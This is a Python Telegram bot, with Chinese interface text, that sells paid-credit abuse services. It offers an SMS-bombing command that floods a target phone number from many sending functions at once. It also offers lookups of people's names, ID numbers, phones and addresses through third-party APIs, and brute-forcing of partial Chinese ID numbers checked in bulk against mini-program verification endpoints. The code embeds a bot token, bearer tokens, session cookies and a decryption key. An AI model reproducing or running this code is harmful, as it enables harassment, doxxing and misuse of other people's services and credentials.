import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import sms_list 
import sms_list_new  # 引入新接口文件
from sms_list import *
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
CURRENT_X_TOKEN = DEFAULT_TOKEN
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def save_token(new_tk):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = new_tk
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(new_tk)

# ================= 2. 解密与查询逻辑 =================

def decrypt_data(encrypted_text_hex, key):
    try:
        ciphertext = binascii.unhexlify(encrypted_text_hex)
        key = binascii.unhexlify(key)
        cipher = DES3.new(key, DES3.MODE_ECB)
        decrypted_data = cipher.decrypt(ciphertext)
        try:
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
        except ValueError:
            invalid_chars = [b'\0', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f',
                             b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f']
            for char in invalid_chars:
                decrypted_data = decrypted_data.replace(char, b'')
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
    except (binascii.Error, ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}

def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        user_points[uid] -= 2.5
        save_points()
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def hb_search_logic(chat_id, search_value, uid):
    url = "https://api.91jkj.com/residentshealth"
    headers = {
        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
    }
    try:
        response = requests.post(url, data={"search": search_value}, headers=headers)
        result_json = json.loads(response.text)
        encrypted_text_hex = result_json.get('data')
        if encrypted_text_hex:
            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
            if "error" in result_data:
                bot.send_message(chat_id, result_data["error"])
            elif "page" in result_data and result_data["page"]:
                user_points[uid] -= 3.5
                save_points()
                result_message = "✅查询结果:\n"
                for item in result_data["page"]:
                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "查询为空")
        else:
            bot.send_message(chat_id, "响应中data字段为空")
    except:
        bot.send_message(chat_id, "查询接口请求异常")

# ================= 3. 辅助功能 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (
        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
    )

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# ================= 4. 核验逻辑 =================

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5
        save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running = None, True
    lock = threading.Lock()
    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            with lock: current_done = done
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
            except: pass
    threading.Thread(target=progress_monitor, daemon=True).start()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
                        is_running = False
        except: pass
        finally:
            with lock: done += 1
    with ThreadPoolExecutor(max_workers=10) as ex: ex.map(verify, id_list)
    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')

# ================= 5. 短信轰炸 (整合新旧接口) =================

def get_all_senders():
    all_funcs = []
    # 1. 获取旧文件 sms_list.py 中的函数
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    
    # 2. 获取新文件 sms_list_new.py 中的列表接口
    if hasattr(sms_list_new, 'NEW_PLATFORMS'):
        for name, func in sms_list_new.NEW_PLATFORMS:
            if func not in all_funcs:
                all_funcs.append(func)
                
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足(5.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 5.5; save_points()
    
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 6. 管理与业务指令 =================

@bot.message_handler(commands=['cyh'])
def cyh_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)！")
    user_states[message.chat.id] = {'step': 'cyh_id'}
    bot.send_message(message.chat.id, "请输入要查询的身份证号：")

@bot.message_handler(commands=['hb'])
def hb_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "👑 **管理员控制台**\n\n`/add ID 分数`\n`/set_token`", parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def add_points_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        p = message.text.split()
        tid, amt = int(p[1]), float(p[2])
        user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
        bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
    except: pass

@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "请输入X-Token：")
    bot.register_next_step_handler(msg, lambda m: [save_token(m.text.strip()), bot.send_message(m.chat.id, "✅ Token已更新")])

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in user_points: user_points[uid] = 0.0
    bot.send_message(message.chat.id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())

@bot.message_handler(commands=['pl'])
def pl_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'v_name'}
    bot.send_message(message.chat.id, "请输入姓名：")

@bot.message_handler(commands=['bq'])
def bq_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'g_card'}
    bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")

@bot.message_handler(commands=['2ys'])
def cmd_2ys_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入**姓名 身份证号**", parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return 
    
    if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
        state = user_states.get(chat_id)
        if state and state['step'] == 'cyh_id':
            del user_states[chat_id]
            return xiaowunb_query_logic(chat_id, text, uid)
            
        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
        return hb_search_logic(chat_id, text, uid)

    match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
    if match_2ys:
        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
        return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
    
    state = user_states.get(chat_id)
    if not state: return
    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text})
        bot.send_message(chat_id, f"✅ 姓名：{text}\n请发送身份证列表：")
    elif state['step'] == 'v_ids':
        ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
        if ids:
            m = bot.send_message(chat_id, get_ui_bar(0, len(ids)))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, state['name'], ids, uid)).start()
        del user_states[chat_id]
    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女):")
    elif state['step'] == 'g_sex':
        user_points[uid] -= 0.5; save_points()
        base_17 = state['card'][:17]
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
        if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
        else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
        ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
        generated_cache[uid] = ids
        with open("铭.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
        with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！", reply_markup=markup)
        del user_states[chat_id]
    elif state['step'] == 'v_name_after_gen':
        if uid in generated_cache:
            m = bot.send_message(chat_id, get_ui_bar(0, len(generated_cache[uid])))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, text, generated_cache[uid], uid)).start()
        del user_states[chat_id]

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = (
            "🛠️️使用帮助\n"
            "短信测压\n"
            "发送 /sms 手机号\n"
            "每次消耗 5.5 积分\n"
            "——————————————————\n"
            "批量二要素核验\n"
            "发送 /pl 进行核验\n"
            "每次查询扣除 2.5 积分\n"
            "——————————————————\n"
            "补齐身份证and核验\n"
            "发送 /bq 进行查询\n"
            "每次补齐扣除 0.5 积分\n"
            "——————————————————\n"
            "单次二要素核验\n"
            "发送 /2ys 进行核验\n"
            "每次核验扣除 0.5 积分\n"
            "——————————————————\n"
            "常用号查询\n"
            "发送 /cyh 进行查询\n"
            "每次查询扣除 2.5 积分\n"
            "——————————————————\n"
            "河北全户查询\n"
            "发送 /hb 进行查询\n"
            "每次查询扣除 3.5 积分\n"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())
    elif call.data == "start_verify_flow":
        bot.send_message(call.message.chat.id, "请输入姓名:"); user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}

if __name__ == '__main__':
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
